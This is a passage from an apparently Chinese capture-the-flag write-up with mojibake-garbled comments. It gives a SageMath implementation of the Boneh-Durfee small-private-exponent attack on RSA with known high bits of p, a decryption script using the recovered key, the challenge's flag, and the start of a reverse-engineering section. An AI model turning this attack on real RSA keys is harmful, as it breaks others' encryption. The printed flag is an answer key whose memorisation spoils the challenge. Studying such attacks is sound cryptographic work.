class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.clock = time.time</span><br><span class="line"> </span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># å¦‚æœæ™¶æ ¼è¾¾åˆ°è¯¥å°ºå¯¸ï¼Œåˆ™åœæ­¢ç§»é™¤</span></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºæœ‰ç”¨çŸ¢é‡çš„ç»Ÿè®¡æ•°æ®</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºå¸¦æœ‰ 0 å’Œ X çš„çŸ©é˜µ</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>: </span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="comment">#print (a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°è¯•åˆ é™¤æ— ç”¨çš„å‘é‡</span></span><br><span class="line"><span class="comment"># ä»å½“å‰ = n-1ï¼ˆæœ€åä¸€ä¸ªå‘é‡ï¼‰å¼€å§‹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># æˆ‘ä»¬ä»å½“å‰ = n-1ï¼ˆæœ€åä¸€ä¸ªå‘é‡ï¼‰å¼€å§‹</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># å¼€å§‹ä»åé¢æ£€æŸ¥</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#  å¦‚æœå®ƒæ²¡æœ‰ç”¨</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">             <span class="comment"># è®©æˆ‘ä»¬æ£€æŸ¥å®ƒæ˜¯å¦å½±å“å…¶ä»–å‘é‡</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># å¦‚æœå¦ä¸€ä¸ªå‘é‡å—åˆ°å½±å“ï¼š</span></span><br><span class="line">                <span class="comment"># æˆ‘ä»¬å¢åŠ è®¡æ•°</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># ç­‰çº§ï¼š0</span></span><br><span class="line">            <span class="comment"># å¦‚æœæ²¡æœ‰å…¶ä»–è½½ä½“æœ€ç»ˆå—åˆ°å½±å“</span></span><br><span class="line">            <span class="comment"># æˆ‘ä»¬åˆ é™¤å®ƒ</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;* removing unhelpful vector&quot;, ii)</span></span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">           <span class="comment"># ç­‰çº§ï¼š1</span></span><br><span class="line">            <span class="comment">#å¦‚æœåªæœ‰ä¸€ä¸ªå—åˆ°å½±å“ï¼Œæˆ‘ä»¬ä¼šæ£€æŸ¥</span></span><br><span class="line">            <span class="comment"># å¦‚æœå®ƒæ­£åœ¨å½±å“åˆ«çš„å‘é‡</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># å¦‚æœå®ƒå½±å“å“ªæ€•ä¸€ä¸ªå‘é‡</span></span><br><span class="line">                    <span class="comment"># æˆ‘ä»¬æ”¾å¼ƒè¿™ä¸ª</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># å¦‚æœæ²¡æœ‰å…¶ä»–å‘é‡å—åˆ°å½±å“ï¼Œåˆ™å°†å…¶åˆ é™¤ï¼Œå¹¶ä¸”</span></span><br><span class="line">                <span class="comment"># è¿™ä¸ªæœ‰ç”¨çš„å‘é‡ä¸å¤Ÿæœ‰ç”¨</span></span><br><span class="line">                <span class="comment">#ä¸æˆ‘ä»¬æ— ç”¨çš„ç›¸æ¯”</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="comment">#print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span></span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1ï¼Œ-1 å¦‚æœ &quot;strict=true&quot;ï¼Œå¹¶ä¸”è¡Œåˆ—å¼ä¸å—çº¦æŸ</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> åœ¨ä»¥ä¸‹æƒ…å†µä¸‹æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼š</span></span><br><span class="line"><span class="string">* d &lt; N^delta</span></span><br><span class="line"><span class="string">* |x|&lt; e^delta</span></span><br><span class="line"><span class="string">* |y|&lt; e^0.5</span></span><br><span class="line"><span class="string">æ¯å½“ delta &lt; 1 - sqrtï¼ˆ2ï¼‰/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)   <span class="comment">#å¤šé¡¹å¼ç¯</span></span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u)        <span class="comment">#  u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"> </span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># x-ç§»ä½</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># å•é¡¹å¼ x ç§»ä½åˆ—è¡¨</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials(): <span class="comment">#å¯¹äºå¤šé¡¹å¼ä¸­çš„å•é¡¹å¼ã€‚å•é¡¹å¼ï¼ˆï¼‰ï¼š</span></span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:  <span class="comment"># å¦‚æœå•é¡¹ä¸åœ¨å•é¡¹ä¸­</span></span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># y-ç§»ä½</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># å•é¡¹å¼ y ç§»ä½åˆ—è¡¨</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ„é€ æ ¼ B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#çº¦åŒ–æ ¼çš„åŸå‹</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment">#  #è‡ªåŠ¨åˆ é™¤</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># é‡ç½®ç»´åº¦</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ£€æŸ¥å‘é‡æ˜¯å¦æœ‰å¸®åŠ©</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ£€æŸ¥è¡Œåˆ—å¼æ˜¯å¦æ­£ç¡®ç•Œå®š</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#BB = BB.BKZ(block_size=25)</span></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ›¿æ¢å‘é‡ i å’Œ j -&gt;å¤šé¡¹å¼ 1 å’Œ 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;åœ¨æ ¼ä¸­å¯»æ‰¾çº¿æ€§æ— å…³å‘é‡&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># å¯¹äºi and j, æ„é€ ä¸¤ä¸ªå¤šé¡¹å¼</span></span><br><span class="line"> </span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># ç»“æœ</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment">##################################################################</span></span><br><span class="line">    <span class="comment"># éšæœºç”Ÿæˆæ•°æ®</span></span><br><span class="line">    <span class="comment">###############################################################</span></span><br><span class="line">    <span class="comment">#start_time =time.perf_counter</span></span><br><span class="line">    start =time.clock()</span><br><span class="line">    size=<span class="number">512</span></span><br><span class="line">    length_N = <span class="number">2</span>*size;</span><br><span class="line">    ss=<span class="number">0</span></span><br><span class="line">    s=<span class="number">70</span>;</span><br><span class="line">    M=<span class="number">1</span>   <span class="comment"># the number of experiments</span></span><br><span class="line">    delta = <span class="number">299</span>/<span class="number">1024</span></span><br><span class="line">    <span class="comment"># p =  random_prime(2^512,2^511)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"><span class="comment">#         p =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         q =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         if(p&lt;q):</span></span><br><span class="line"><span class="comment">#             temp=p</span></span><br><span class="line"><span class="comment">#             p=q</span></span><br><span class="line"><span class="comment">#             q=temp</span></span><br><span class="line">        <span class="comment">#N = 69207225407236621802315929835231678761546030648552499878532449478584182354765750349071726491300234635799981022731725455349420914234822062855723904939138000102040435210706843712478106458961468791872716857992483073814316706027260218386995042614451566024972455009936823034721213885693157803402838690192435869721</span></span><br><span class="line">        N = <span class="number">95987463597889741532025162535631829592517704738860431905943824498597890101136796870879646153634795544527837591685182170270252555997933421564167468816667980089869165228796395618775798781717091178143300536302805947806332962230499807469654672313206953750808878098101882367253566423367338396717229488061237787619</span></span><br><span class="line">        e = <span class="number">12761568528114005244342182138319275328501544878744699681091257281459893043102455333575012392492554249378138377894473691530001400901111860569849400611145049669197371290112261284014768486937294128410391332641648640840309135718123516725634190495261570498188176102281061084366456374907755950527213961595506707585</span></span><br><span class="line">        c = <span class="number">35154471719082941146017277238175991504655570882040897713927696748547265178059291385527810510087300325678561502592029686486144851647754163110759942860051150957340793828236482243293747881251009434747066136505663782280758979333019882382608002308773317613847702048959887017010151916544703971113441862351668075919</span></span><br><span class="line">        hint1 = <span class="number">1175980694459189065778</span></span><br><span class="line">        hint2 = <span class="number">632846170973644915854</span></span><br><span class="line"><span class="comment">#         print (&quot;pçœŸå®é«˜&quot;,s,&quot;æ¯”ç‰¹ï¼š&quot;, int(p/2^(512-s)))</span></span><br><span class="line"><span class="comment">#         print (&quot;qçœŸå®é«˜&quot;,s,&quot;æ¯”ç‰¹ï¼š&quot;, int(q/2^(512-s)))</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#         N = p*q;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># è§£å¯†æŒ‡æ•°dçš„æŒ‡æ•°( æœ€å¤§0.292)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        m = <span class="number">7</span>   <span class="comment"># æ ¼å¤§å°ï¼ˆè¶Šå¤§è¶Šå¥½/è¶Šæ…¢ï¼‰</span></span><br><span class="line">        t = <span class="built_in">round</span>(((<span class="number">1</span>-<span class="number">2</span>*delta) * m))  <span class="comment"># æ¥è‡ª Herrmann å’Œ May çš„ä¼˜åŒ–</span></span><br><span class="line">        X = floor(N^delta)  <span class="comment"># </span></span><br><span class="line">        Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>)/<span class="number">2</span>^s)    <span class="comment"># å¦‚æœ pã€ q å¤§å°ç›¸åŒï¼Œåˆ™æ­£ç¡®</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(hint1),<span class="built_in">int</span>(hint1)+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n l=&#x27;</span>,l)</span><br><span class="line">            pM=l;</span><br><span class="line">            p0=pM*<span class="number">2</span>^(size-s)+<span class="number">2</span>^(size-s)-<span class="number">1</span>;</span><br><span class="line">            q0=N/p0;</span><br><span class="line">            qM=<span class="built_in">int</span>(q0/<span class="number">2</span>^(size-s))</span><br><span class="line">            A = N + <span class="number">1</span>-pM*<span class="number">2</span>^(size-s)-qM*<span class="number">2</span>^(size-s);</span><br><span class="line">        <span class="comment">#A = N+1</span></span><br><span class="line">            P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol = <span class="number">1</span> + x * (A + y)  <span class="comment">#æ„å»ºçš„æ–¹ç¨‹</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># Checking bounds</span></span><br><span class="line">            <span class="comment">#if debug:</span></span><br><span class="line">                <span class="comment">#print (&quot;=== æ ¸å¯¹æ•°æ® ===&quot;)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta:&quot;, delta)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of e:&quot;, ceil(log(e)/log(2)))  # eçš„bitæ•°</span></span><br><span class="line">                <span class="comment"># print (&quot;* size of N:&quot;, len(bin(N)))          # Nçš„bitæ•°</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of N:&quot;, ceil(log(N)/log(2)))  # Nçš„bitæ•°</span></span><br><span class="line">                <span class="comment">#print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># boneh_durfee</span></span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="comment">###print (&quot;=== running algorithm ===&quot;)</span></span><br><span class="line">                start_time = time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;=== solution found ===&quot;)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"> </span><br><span class="line">                d_sol = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">                ss=ss+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;pçš„é«˜æ¯”ç‰¹ä¸ºï¼š&quot;</span>,l)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;qçš„é«˜æ¯”ç‰¹ä¸ºï¼š&quot;</span>,qM)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;d=&quot;</span>,d_sol) </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line">            <span class="comment">#break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ss=&quot;</span>,ss)</span><br><span class="line">                            <span class="comment">#end=time.process_time</span></span><br><span class="line">        end=time.clock()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Running time: %s Seconds&#x27;</span>%(end-start))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()  </span><br></pre></td></tr></table></figure><p>â€‹å¾—åˆ°äº† dï¼Œç„¶åè§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">95987463597889741532025162535631829592517704738860431905943824498597890101136796870879646153634795544527837591685182170270252555997933421564167468816667980089869165228796395618775798781717091178143300536302805947806332962230499807469654672313206953750808878098101882367253566423367338396717229488061237787619</span></span><br><span class="line">e = <span class="number">12761568528114005244342182138319275328501544878744699681091257281459893043102455333575012392492554249378138377894473691530001400901111860569849400611145049669197371290112261284014768486937294128410391332641648640840309135718123516725634190495261570498188176102281061084366456374907755950527213961595506707585</span></span><br><span class="line">c = <span class="number">35154471719082941146017277238175991504655570882040897713927696748547265178059291385527810510087300325678561502592029686486144851647754163110759942860051150957340793828236482243293747881251009434747066136505663782280758979333019882382608002308773317613847702048959887017010151916544703971113441862351668075919</span></span><br><span class="line">d = <span class="number">994872951830622609173239108988480436496396666299008546372509127121113351371824434704770953</span></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#wdflag&#123;a14a7fa0-4e7b-4624-ad0c-36c31dd8012e&#125;</span></span><br></pre></td></tr></table></figure><p>crypto02ï¼š</p><h1 id="reverse02"><a class="markdownIt-Anchor" href="#reverse02">#</a> reverse02ï¼š</h1><p>â€‹flag æœ‰å››ä¸ªéƒ¨åˆ†ï¼Œæ¯ä¸ªéƒ¨åˆ†éƒ½æœ‰ä¸€ä¸ªåŠ å¯†ã€‚</p><p>â€‹é¦–å…ˆç¬¬ä¸€éƒ¨åˆ†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the flag:&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( fgets(s, <span class="number">41</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) != <span class="number">40</span> || <span class="built_in">strncmp</span>(s, <span class="string">&quot;wdflag&#123;&quot;</span>, <span class="number">7uLL</span>) || v19[<span class="number">32</span>] != <span class="number">125</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>â€‹è¾“å…¥ 